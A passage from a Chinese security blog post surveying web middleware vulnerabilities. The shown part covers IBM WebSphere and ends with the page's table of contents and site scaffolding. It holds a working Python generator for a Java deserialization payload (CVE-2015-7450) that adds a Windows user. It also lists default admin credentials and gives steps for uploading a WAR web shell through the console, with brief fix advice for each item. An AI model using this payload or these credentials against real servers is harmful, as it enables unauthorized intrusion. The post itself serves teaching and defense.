class="line">&lt;/SOAP-ENV:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>Payload执行的命令是 <code>net user lxh lxh /add</code>,效果如下：<br><img src="/2019/03/04/middleware/CVE-2015-7450-02.png" alt="CVE-2015-7450-02"></p>
+<p>如果想要更改执行的命令，可通过如下代码，代码在python3下执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line">from binascii import unhexlify</div><div class="line"></div><div class="line">command = &quot;net user lxh lxh /add&quot;</div><div class="line">serObj = unhexlify(&quot;ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400&quot;)</div><div class="line">serObj += (chr(len(command)) + command).encode(&apos;ascii&apos;)</div><div class="line">serObj += unhexlify(&quot;740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A&quot;)</div><div class="line"></div><div class="line">serObjB64 = base64.b64encode(serObj).decode()</div><div class="line">print(serObjB64)</div></pre></td></tr></table></figure></p>
+<p>将输出的serObjB64，替换到上面Payload中的params节点，其余无需改变。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;params xsi:type=&quot;ns1:[Ljava.lang.Object;&quot;&gt;&#123;serObjB64&#125;&lt;/params&gt;</div></pre></td></tr></table></figure></p>
+<p>回显参考DeserializeExploit.jar(laster)</p>
+<h3 id="修复建议-28"><a href="#修复建议-28" class="headerlink" title="修复建议"></a>修复建议</h3><p>7.x版本已不提供支持，因此选择升级版本。<br>若版本还在IBM支持范围，可选择打补丁。</p>
+<h2 id="弱口令-amp-amp-后台Getshell"><a href="#弱口令-amp-amp-后台Getshell" class="headerlink" title="弱口令 &amp;&amp; 后台Getshell"></a>弱口令 &amp;&amp; 后台Getshell</h2><ol>
+<li>在6.x至7.0版本，后台登陆只需要输入 admin作为用户标识，无需密码，即可登陆后台。</li>
+<li>websphere/ websphere</li>
+<li>system/ manager</li>
+</ol>
+<p>1.点击WebSphere 企业应用程序，点击安装。<br><img src="/2019/03/04/middleware/WebSphere01.png" alt="WebSphere01"></p>
+<p>2.上传war包，点击下一步。<br><img src="/2019/03/04/middleware/WebSphere02.png" alt="WebSphere02"></p>
+<p>3.一直点击下一步，直到下图，填写上下文根，关系到你访问的URL，接着一直点下一步直到安装完成。<br><img src="/2019/03/04/middleware/WebSphere03.png" alt="WebSphere03"></p>
+<p>4.安装完成之后，点击保存主配置，然后回到WebSphere 企业应用程序，选中war包启动，访问shell。<br><img src="/2019/03/04/middleware/WebSphere04.png" alt="WebSphere04"></p>
+<h3 id="修复建议-29"><a href="#修复建议-29" class="headerlink" title="修复建议"></a>修复建议</h3><p>设置密码。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.google.com.hk" target="_blank" rel="external">https://www.google.com.hk</a><br><a href="https://www.baidu.com" target="_blank" rel="external">https://www.baidu.com</a><br><a href="http://www.wooyun.org" target="_blank" rel="external">http://www.wooyun.org</a><br><a href="https://github.com/vulhub" target="_blank" rel="external">https://github.com/vulhub</a> 漏洞列表<br><a href="http://cve.mitre.org" target="_blank" rel="external">http://cve.mitre.org</a> 漏洞列表</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    lyxhh
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.lxhsec.com/2019/03/04/middleware/" title="Web中间件常见漏洞总结">http://www.lxhsec.com/2019/03/04/middleware/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/24/exploit/" rel="next" title="exploits">
+                <i class="fa fa-chevron-left"></i> exploits
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/17/AndroidReverse/" rel="prev" title="Android Reverse">
+                Android Reverse <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMjIyNy84Nzkx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/1.jpg"
+                alt="lyxhh" />
+            
+              <p class="site-author-name" itemprop="name">lyxhh</p>
+              <p class="site-description motion-element" itemprop="description">有你给的阳光，没有理由绝望。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secbug.org/" title="破晓团队" target="_blank">破晓团队</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS"><span class="nav-number">1.</span> <span class="nav-text">IIS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解析漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-6-x"><span class="nav-number">1.1.1.</span> <span class="nav-text">IIS 6.x</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修复建议"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-x"><span class="nav-number">1.1.2.</span> <span class="nav-text">IIS 7.x</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修复建议-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT任意文件写入"><span class="nav-number">1.2.</span> <span class="nav-text">PUT任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-2"><span class="nav-number">1.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS短文件漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">IIS短文件漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-3"><span class="nav-number">1.3.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-SYS远程代码执行-MS15-034"><span class="nav-number">1.4.</span> <span class="nav-text">HTTP.SYS远程代码执行 (MS15-034)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-4"><span class="nav-number">1.4.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-CVE-2017-7269"><span class="nav-number">1.5.</span> <span class="nav-text">RCE-CVE-2017-7269</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-5"><span class="nav-number">1.5.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache"><span class="nav-number">2.</span> <span class="nav-text">Apache</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解析漏洞-1"><span class="nav-number">2.1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#未知扩展名解析漏洞"><span class="nav-number">2.1.1.</span> <span class="nav-text">未知扩展名解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AddHandler导致的解析漏洞。"><span class="nav-number">2.1.2.</span> <span class="nav-text">AddHandler导致的解析漏洞。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><span class="nav-number">2.1.3.</span> <span class="nav-text">Apache HTTPD 换行解析漏洞（CVE-2017-15715）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-6"><span class="nav-number">2.1.4.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx"><span class="nav-number">3.</span> <span class="nav-text">Nginx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx配置文件错误导致的解析漏洞"><span class="nav-number">3.1.</span> <span class="nav-text">Nginx配置文件错误导致的解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-7"><span class="nav-number">3.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-空字节任意代码执行漏洞"><span class="nav-number">3.2.</span> <span class="nav-text">Nginx 空字节任意代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-8"><span class="nav-number">3.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）"><span class="nav-number">3.3.</span> <span class="nav-text">Nginx 文件名逻辑漏洞（CVE-2013-4547）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-9"><span class="nav-number">3.3.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nginx-配置错误导致的安全问题"><span class="nav-number">3.4.</span> <span class="nav-text">Nginx 配置错误导致的安全问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CRLF注入"><span class="nav-number">3.4.1.</span> <span class="nav-text">CRLF注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修复建议-10"><span class="nav-number">3.4.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录穿越"><span class="nav-number">3.4.2.</span> <span class="nav-text">目录穿越</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修复建议-11"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录遍历"><span class="nav-number">3.4.3.</span> <span class="nav-text">目录遍历</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修复建议-12"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#add-header被覆盖"><span class="nav-number">3.4.4.</span> <span class="nav-text">add_header被覆盖</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat"><span class="nav-number">4.</span> <span class="nav-text">Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-任意文件写入（CVE-2017-12615）"><span class="nav-number">4.1.</span> <span class="nav-text">Tomcat 任意文件写入（CVE-2017-12615）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-13"><span class="nav-number">4.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-远程代码执行（CVE-2019-0232）"><span class="nav-number">4.2.</span> <span class="nav-text">Tomcat 远程代码执行（CVE-2019-0232）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-14"><span class="nav-number">4.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-弱口令-amp-amp-后台getshell漏洞"><span class="nav-number">4.3.</span> <span class="nav-text">Tomcat + 弱口令 && 后台getshell漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-15"><span class="nav-number">4.3.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-manager-App-暴力破解"><span class="nav-number">4.4.</span> <span class="nav-text">Tomcat manager App 暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-16"><span class="nav-number">4.4.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JBoss"><span class="nav-number">5.</span> <span class="nav-text">JBoss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><span class="nav-number">5.1.</span> <span class="nav-text">JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-JMXInvokerServlet-反序列化漏洞"><span class="nav-number">5.2.</span> <span class="nav-text">JBoss JMXInvokerServlet 反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-EJBInvokerServlet-反序列化漏洞"><span class="nav-number">5.3.</span> <span class="nav-text">JBoss EJBInvokerServlet 反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复建议-17"><span class="nav-number">5.4.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JBoss-lt-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><span class="nav-number">5.5.</span> <span class="nav-text">JBoss <=4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-18"><span class="nav-number">5.5.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Administration-Console-弱口令"><span class="nav-number">5.6.</span> <span class="nav-text">Administration Console 弱口令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-19"><span class="nav-number">5.6.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JMX-Console未授权访问"><span class="nav-number">5.7.</span> <span class="nav-text">JMX Console未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-20"><span class="nav-number">5.7.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebLogic"><span class="nav-number">6.</span> <span class="nav-text">WebLogic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XMLDecoder-反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506）"><span class="nav-number">6.1.</span> <span class="nav-text">XMLDecoder 反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-21"><span class="nav-number">6.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（CVE-2019-2725）"><span class="nav-number">6.2.</span> <span class="nav-text">Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（CVE-2019-2725）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bea-wls9-async-response-war"><span class="nav-number">6.2.1.</span> <span class="nav-text">bea_wls9_async_response.war</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Weblogic-10-3-6-利用oracle-toplink-internal-sessions-UnitOfWorkChangeSet构造函数执行readObject"><span class="nav-number">6.2.1.1.</span> <span class="nav-text">Weblogic 10.3.6 利用oracle.toplink.internal.sessions.UnitOfWorkChangeSet构造函数执行readObject().</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weblogic-12-1-3-利用org-slf4j-ext-EventData构造函数执行readObject"><span class="nav-number">6.2.1.2.</span> <span class="nav-text">Weblogic 12.1.3 利用org.slf4j.ext.EventData构造函数执行readObject().</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wls-wsat-war"><span class="nav-number">6.2.2.</span> <span class="nav-text">wls-wsat.war</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Weblogic-10-3-6-回显构造"><span class="nav-number">6.2.2.1.</span> <span class="nav-text">Weblogic 10.3.6 回显构造.</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weblogic-12-1-3-回显构造"><span class="nav-number">6.2.2.2.</span> <span class="nav-text">Weblogic 12.1.3 回显构造.</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><span class="nav-number">6.3.</span> <span class="nav-text">Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-22"><span class="nav-number">6.3.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-任意文件上传漏洞（CVE-2018-2894）"><span class="nav-number">6.4.</span> <span class="nav-text">Weblogic 任意文件上传漏洞（CVE-2018-2894）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-23"><span class="nav-number">6.4.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-SSRF漏洞-（CVE-2014-4210）"><span class="nav-number">6.5.</span> <span class="nav-text">Weblogic SSRF漏洞 （CVE-2014-4210）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-24"><span class="nav-number">6.5.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-弱口令-amp-amp-后台getshell"><span class="nav-number">6.6.</span> <span class="nav-text">Weblogic 弱口令 && 后台getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-25"><span class="nav-number">6.6.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GlassFish"><span class="nav-number">7.</span> <span class="nav-text">GlassFish</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GlassFish-Directory-Traversal（CVE-2017-1000028）"><span class="nav-number">7.1.</span> <span class="nav-text">GlassFish Directory Traversal（CVE-2017-1000028）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-26"><span class="nav-number">7.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GlassFish-后台Getshell"><span class="nav-number">7.2.</span> <span class="nav-text">GlassFish 后台Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-27"><span class="nav-number">7.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebSphere"><span class="nav-number">8.</span> <span class="nav-text">WebSphere</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java反序列化-CVE-2015-7450）"><span class="nav-number">8.1.</span> <span class="nav-text">Java反序列化(CVE-2015-7450）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-28"><span class="nav-number">8.1.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#弱口令-amp-amp-后台Getshell"><span class="nav-number">8.2.</span> <span class="nav-text">弱口令 && 后台Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议-29"><span class="nav-number">8.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">9.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lyxhh</span>
+
+
+</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
